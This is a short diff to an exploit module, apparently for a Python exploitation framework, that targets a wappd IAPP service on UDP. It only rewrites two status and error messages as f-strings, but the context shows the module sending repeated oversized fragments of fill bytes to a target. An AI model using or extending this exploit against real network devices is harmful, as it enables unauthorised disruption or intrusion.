@@ -124,7 +124,7 @@ class Exploit(BaseExploit):
     def run(self) -> None:
         if not self.check():
             print_error(
-                "Target does not appear to have wappd IAPP service on UDP/{}".format(self.port)
+                f"Target does not appear to have wappd IAPP service on UDP/{self.port}"
             )
             return
 
@@ -167,11 +167,8 @@ class Exploit(BaseExploit):
         chunk = fill_byte * self.fragment_size
 
         print_status(
-            "Sending {} IAPP fragment(s) of {} bytes each to {}:{} "
-            "(sequence 0x{:04x})".format(
-                self.fragment_count, self.fragment_size,
-                self.target, self.port, sequence,
-            )
+            f"Sending {self.fragment_count} IAPP fragment(s) of {self.fragment_size} bytes each to {self.target}:{self.port} "
+            f"(sequence 0x{sequence:04x})"
         )
 
         for i in range(self.fragment_count):
